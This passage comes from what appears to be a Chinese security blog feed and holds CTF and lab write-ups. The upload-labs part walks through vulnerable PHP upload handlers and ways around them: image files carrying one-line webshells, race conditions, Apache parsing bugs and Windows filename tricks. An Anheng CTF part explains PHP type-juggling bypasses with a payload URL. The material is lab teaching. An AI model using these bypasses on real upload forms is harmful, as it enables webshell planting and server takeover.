class="line">&#125;</span><br></pre></td></tr></table></figure><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。 </p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>getimagesize()</strong> 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 <code>IMG</code> 标记中的 height/width 文本字符串。 </p><p>image_type_to_extension — 取得图像类型的文件后缀 </p><h4 id="pass-9"><a href="#pass-9" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。 </p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exif_imagetype — 判断一个图像的类型 </p><h4 id="pass-10"><a href="#pass-10" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 </p><h4 id="pass-11"><a href="#pass-11" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-12"><a href="#pass-12" class="headerlink" title="pass"></a>pass</h4><p>利用条件竞争删除文件时间差绕过。 </p><p>文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传 </p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>利用上传重命名竞争+Apache解析漏洞，成功绕过。</p><p>上传名字为<code>18.php.7Z</code>的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。</p><p>然后利用Apache的解析漏洞，即可获得shell </p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pathinfo — 返回文件路径的信息(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p><p>pathinfo() 函数以数组的形式返回关于文件路径的信息。</p><p>返回的数组元素如下：</p><ul><li>[dirname]</li><li>[basename]</li><li>[extension]</li></ul><p>语法</p><blockquote><p>pathinfo(path,options)</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要检查的路径。</td></tr><tr><td>options</td><td>可选。规定要返回的数组元素。默认是 all。<br>可能的值：<br>PATHINFO_DIRNAME - 只返回 dirname<br>PATHINFO_BASENAME - 只返回 basename<br>PATHINFO_EXTENSION - 只返回 extension</td></tr></tbody></table><h4 id="pass-13"><a href="#pass-13" class="headerlink" title="pass"></a>pass</h4><p>大小写绕过</p><p>save_name修改为<code>caidao19.php.</code>即可 </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/1530613222876.png" alt="1530613222876"></p><p>参考writeup：</p><p><a href="https://fuping.site/2018/06/04/upload-labs-writeup/" target="_blank" rel="noopener">https://fuping.site/2018/06/04/upload-labs-writeup/</a></p><p><a href="https://github.com/LandGrey/upload-labs-writeup" target="_blank" rel="noopener">https://github.com/LandGrey/upload-labs-writeup</a></p><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a></p><p><a href="https://blog.csdn.net/qq_33020901/article/details/78952684" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/78952684</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;c0ny1师傅写的upload-labs，受益良多&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="upload" scheme="http://blog.Lhaihai.wang/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>2018安恒五月月赛WriteUp</title>
    <link href="http://blog.Lhaihai.wang/2018/05/22/2018%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E6%9C%88%E8%B5%9BWriteUp/"/>
    <id>http://blog.Lhaihai.wang/2018/05/22/2018安恒五月月赛WriteUp/</id>
    <published>2018-05-22T15:18:21.000Z</published>
    <updated>2018-05-22T15:23:14.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><blockquote><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 </p></blockquote><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br></pre></td></tr></table></figure><p>如果有get参数A_A，就把A_A的值赋给$str</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。 </p><p>$_SERVER[“QUERY_STRING”]获取查询语句，实例中可知，获取的是?后面的值 </p><p>例如<code>http://101.71.29.5:10007/?A_A=1</code></p><p>$_SERVER[“QUERY_STRING”]的值是：<code>A_A=1</code></p><p>那么怎么绕过这个strpos并且把$str赋值呢？</p><p>我们来了解一下下面这个php特性</p><blockquote><p>php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。 那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。 </p></blockquote><p>那么这里绕过可以用A.A,A+A(这道题测试+也是可以绕过)</p><p><a href="https://blog.csdn.net/iamtheodore/article/details/6098521" target="_blank" rel="noopener">PHP获取当前url路径的函数及服务器变量:QUERY_STRING、REQUEST_URI、SCRIPT</a> </p><p><a href="https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/" target="_blank" rel="noopener">https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里判断</p><p>$str不能小于9999999999，</p><p>(string)$str不能大于0</p><p>贴一下xsser直播讲解的例子，我们可以看到 []&gt;9999999是真，[]&gt;-1也是真，反过来就是[]&lt;999999为假</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526966811732.png" alt="1526966811732"></p><p>自己再测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&lt;<span class="number">999999</span>);</span><br><span class="line">var_dump((string)[]);</span><br><span class="line">var_dump((string)[]&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boolean false</span><br><span class="line">string &apos;Array&apos; (length=5)</span><br><span class="line">boolean false</span><br></pre></td></tr></table></figure><p>我们可以看到 (string)[]，php会把数组经过string转换后变为  </p><p> 值为Array的string类型</p><p>因为当字符串和数字比较时，php会把字符串转换为int类型，如果字符串开头是字符，就转换为0</p><p>这样就绕过了<code>elseif ((string)$str&gt;0)</code></p><p>不理解的话再放xsser的两张ppt</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968028071.png" alt="1526968028071"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968048447.png" alt="1526968048447"></p><p>最后总结一下：</p><blockquote><ol><li>用 <code>A.A</code>绕过<code>if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false)</code></li><li>用数组绕过 <code>($str&lt;9999999999)</code>  和 <code>((string)$str&gt;0)</code></li></ol></blockquote><p>playload</p><blockquote><p><a href="http://101.71.29.5:10007/?A+A[]=1" target="_blank" rel="noopener">http://101.71.29.5:10007/?A+A[]=1</a></p></blockquote><p>查看源代码即可看到flag</p><blockquote><p>flag={09bc24026c987ae44a6e424479b2e3} </p></blockquote><p><a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</a> </p><h2 id="不能注册的admin"><a href="#不能注册的admin" class="headerlink" title="不能注册的admin"></a>不能注册的admin</h2><blockquote><p>你敢注册一个“admin”账户吗？敢吗？你试试？ </p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968952854.png" alt="1526968952854"></p><p>查看源代码发现有一段js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">id = $(<span class="string">"#uid"</span>).val();</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#uid"</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(id !== <span class="string">""</span>|| !id)&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">"json.php"</span>,<span class="attr">type</span>:<span class="string">'post'</span>,<span class="attr">data</span>:&#123;<span class="string">'id'</span>:id&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">eval</span>(<span class="string">'('</span> +d +<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">if</span>(data[<span class="string">'id'</span>] !=<span class="string">'undefined'</span> ||data[<span class="string">'id'</span>] !=<span class="string">""</span> ||data[<span class="string">'id'</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">alert(<span class="string">'用户名已存在!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>分析一波，这段代码就是把id参数post给json.php</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970455005.png" alt="1526970455005"></p><p>尝试一波注入，发现不行</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970480922.png" alt="1526970480922"></p><p>查看一下网络，发现响应头写着(Win32)，那可能是windows服务器</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970551824.png" alt="1526970551824"></p><p>想到windows大小写不敏感</p><blockquote><p>1、在window系统中，所有的文件夹或者文件名是不区分大小写的。即在同一个目录下不能同时存在名称相同大小写不一样的文件夹或者文件。</p><p>2、在压缩文件中是可以同时存在如上所述的文件的。例如：文件夹a 和 文件夹A 以及test.txt和TEST.txt是可以同时存在同一目录下的。</p></blockquote><p>补充学习：</p><p><a href="https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten" target="_blank" rel="noopener">https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten</a> Uploader</p><p>实验发现，在Windows系统中， &lt; 符号可以代替扩展名的一部分，如果没有扩展名（没有 <strong>.</strong> ）就可以代替全部。</p><p>例如此目录下有 index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 